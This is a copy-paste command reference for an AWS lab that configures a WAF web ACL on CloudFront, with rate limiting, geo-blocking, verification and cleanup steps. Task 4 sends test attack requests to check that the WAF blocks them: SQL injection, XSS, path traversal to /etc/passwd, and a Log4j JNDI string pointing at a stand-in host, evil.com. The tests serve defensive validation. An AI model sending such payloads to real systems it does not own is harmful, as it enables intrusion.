# AWS WAF CloudFront Lab - Quick Command Reference

> Copy-paste ready commands for the lab. Set your CloudFront distribution ID first.

---

## Setup

```bash
# Set your CloudFront Distribution ID
export CF_ID="YOUR_DISTRIBUTION_ID"
export AWS_REGION="us-east-1"
```

---

## Task 1: Create WAF Web ACL

```bash
# Create Web ACL with AWS Managed Rules
aws wafv2 create-web-acl \
  --name static-site-waf \
  --scope CLOUDFRONT \
  --default-action Allow={} \
  --description "WAF for static website protection" \
  --visibility-config \
    SampledRequestsEnabled=true,CloudWatchMetricsEnabled=true,MetricName=StaticSiteWAF \
  --rules '[
    {
      "Name": "AWS-AWSManagedRulesCommonRuleSet",
      "Priority": 1,
      "Statement": {
        "ManagedRuleGroupStatement": {
          "VendorName": "AWS",
          "Name": "AWSManagedRulesCommonRuleSet"
        }
      },
      "OverrideAction": { "None": {} },
      "VisibilityConfig": {
        "SampledRequestsEnabled": true,
        "CloudWatchMetricsEnabled": true,
        "MetricName": "AWSCommonRules"
      }
    },
    {
      "Name": "AWS-AWSManagedRulesKnownBadInputsRuleSet",
      "Priority": 2,
      "Statement": {
        "ManagedRuleGroupStatement": {
          "VendorName": "AWS",
          "Name": "AWSManagedRulesKnownBadInputsRuleSet"
        }
      },
      "OverrideAction": { "None": {} },
      "VisibilityConfig": {
        "SampledRequestsEnabled": true,
        "CloudWatchMetricsEnabled": true,
        "MetricName": "AWSKnownBadInputs"
      }
    }
  ]' \
  --region us-east-1

# Get WAF ARN
WAF_ARN=$(aws wafv2 list-web-acls \
  --scope CLOUDFRONT \
  --region us-east-1 \
  --query 'WebACLs[?Name==`static-site-waf`].ARN' \
  --output text)

echo "WAF ARN: $WAF_ARN"
```

---

## Task 2: Attach WAF to CloudFront

```bash
# Get current CloudFront config
aws cloudfront get-distribution-config --id "$CF_ID" > /tmp/cf-config.json
ETAG=$(jq -r '.ETag' /tmp/cf-config.json)

# Add WAF to distribution
jq --arg waf "$WAF_ARN" '.DistributionConfig | .WebACLId = $waf' \
  /tmp/cf-config.json > /tmp/cf-config-with-waf.json

# Update distribution
aws cloudfront update-distribution \
  --id "$CF_ID" \
  --if-match "$ETAG" \
  --distribution-config file:///tmp/cf-config-with-waf.json

# Wait for deployment
aws cloudfront wait distribution-deployed --id "$CF_ID"
echo "WAF attached successfully!"
```

---

## Task 3: Add Rate Limiting

```bash
# Get WAF ID and lock token
WAF_ID=$(aws wafv2 list-web-acls --scope CLOUDFRONT --region us-east-1 \
  --query 'WebACLs[?Name==`static-site-waf`].Id' --output text)

LOCK_TOKEN=$(aws wafv2 get-web-acl \
  --name static-site-waf --scope CLOUDFRONT --id "$WAF_ID" \
  --region us-east-1 --query 'LockToken' --output text)

# Get current rules and add rate limit
CURRENT_RULES=$(aws wafv2 get-web-acl \
  --name static-site-waf --scope CLOUDFRONT --id "$WAF_ID" \
  --region us-east-1 --query 'WebACL.Rules')

UPDATED_RULES=$(echo "$CURRENT_RULES" | jq '. + [{
  "Name": "RateLimitRule",
  "Priority": 10,
  "Statement": {"RateBasedStatement": {"Limit": 2000, "AggregateKeyType": "IP"}},
  "Action": {"Block": {}},
  "VisibilityConfig": {"SampledRequestsEnabled": true, "CloudWatchMetricsEnabled": true, "MetricName": "RateLimitRule"}
}]')

# Update Web ACL
aws wafv2 update-web-acl \
  --name static-site-waf --scope CLOUDFRONT --id "$WAF_ID" \
  --lock-token "$LOCK_TOKEN" --default-action Allow={} \
  --visibility-config SampledRequestsEnabled=true,CloudWatchMetricsEnabled=true,MetricName=StaticSiteWAF \
  --rules "$UPDATED_RULES" --region us-east-1
```

---

## Task 4: Test WAF Protection

```bash
# Get CloudFront domain
CF_DOMAIN=$(aws cloudfront get-distribution --id "$CF_ID" \
  --query 'Distribution.DomainName' --output text)

# Test normal request (should return 200)
curl -s -o /dev/null -w "Normal: HTTP %{http_code}\n" "https://$CF_DOMAIN/"

# Test SQL injection (should return 403)
curl -s -o /dev/null -w "SQLi: HTTP %{http_code}\n" "https://$CF_DOMAIN/?id=1'%20OR%20'1'='1"

# Test XSS (should return 403)
curl -s -o /dev/null -w "XSS: HTTP %{http_code}\n" "https://$CF_DOMAIN/?q=%3Cscript%3Ealert(1)%3C/script%3E"

# Test path traversal (should return 403)
curl -s -o /dev/null -w "Path Traversal: HTTP %{http_code}\n" "https://$CF_DOMAIN/../../../etc/passwd"

# Test Log4j (should return 403)
curl -s -o /dev/null -w "Log4j: HTTP %{http_code}\n" "https://$CF_DOMAIN/" -H "X-Api-Version: \${jndi:ldap://evil.com/a}"
```

---

## Task 5: Add Geo-Blocking (Optional)

```bash
# Get fresh lock token
LOCK_TOKEN=$(aws wafv2 get-web-acl --name static-site-waf --scope CLOUDFRONT \
  --id "$WAF_ID" --region us-east-1 --query 'LockToken' --output text)

CURRENT_RULES=$(aws wafv2 get-web-acl --name static-site-waf --scope CLOUDFRONT \
  --id "$WAF_ID" --region us-east-1 --query 'WebACL.Rules')

UPDATED_RULES=$(echo "$CURRENT_RULES" | jq '. + [{
  "Name": "GeoBlockRule",
  "Priority": 5,
  "Statement": {"GeoMatchStatement": {"CountryCodes": ["CN", "RU", "KP"]}},
  "Action": {"Block": {}},
  "VisibilityConfig": {"SampledRequestsEnabled": true, "CloudWatchMetricsEnabled": true, "MetricName": "GeoBlockRule"}
}]')

aws wafv2 update-web-acl --name static-site-waf --scope CLOUDFRONT --id "$WAF_ID" \
  --lock-token "$LOCK_TOKEN" --default-action Allow={} \
  --visibility-config SampledRequestsEnabled=true,CloudWatchMetricsEnabled=true,MetricName=StaticSiteWAF \
  --rules "$UPDATED_RULES" --region us-east-1
```

---

## Verification Commands

```bash
# List Web ACL rules
aws wafv2 get-web-acl --name static-site-waf --scope CLOUDFRONT \
  --id "$WAF_ID" --region us-east-1 --query 'WebACL.Rules[*].Name'

# Check CloudFront WAF association
aws cloudfront get-distribution --id "$CF_ID" \
  --query 'Distribution.DistributionConfig.WebACLId'

# View CloudWatch metrics
aws cloudwatch get-metric-statistics \
  --namespace AWS/WAFV2 --metric-name BlockedRequests \
  --dimensions Name=WebACL,Value=static-site-waf Name=Rule,Value=ALL \
  --start-time $(date -u -v-1H +%Y-%m-%dT%H:%M:%SZ) \
  --end-time $(date -u +%Y-%m-%dT%H:%M:%SZ) \
  --period 300 --statistics Sum --region us-east-1
```

---

## Cleanup Commands

```bash
# Step 1: Remove WAF from CloudFront
aws cloudfront get-distribution-config --id "$CF_ID" > /tmp/cf-config.json
ETAG=$(jq -r '.ETag' /tmp/cf-config.json)
jq '.DistributionConfig | .WebACLId = ""' /tmp/cf-config.json > /tmp/cf-no-waf.json
aws cloudfront update-distribution --id "$CF_ID" --if-match "$ETAG" \
  --distribution-config file:///tmp/cf-no-waf.json
aws cloudfront wait distribution-deployed --id "$CF_ID"

# Step 2: Delete Web ACL
WAF_ID=$(aws wafv2 list-web-acls --scope CLOUDFRONT --region us-east-1 \
  --query 'WebACLs[?Name==`static-site-waf`].Id' --output text)
LOCK_TOKEN=$(aws wafv2 get-web-acl --name static-site-waf --scope CLOUDFRONT \
  --id "$WAF_ID" --region us-east-1 --query 'LockToken' --output text)
aws wafv2 delete-web-acl --name static-site-waf --scope CLOUDFRONT \
  --id "$WAF_ID" --lock-token "$LOCK_TOKEN" --region us-east-1

echo "Cleanup complete!"
```

---

## Cost Summary

| Resource | Monthly Cost |
|----------|-------------|
| Web ACL | $5.00 |
| Rate Limit Rule | $1.00 |
| 1M Requests | $0.60 |
| **Total** | **~$6.60** |
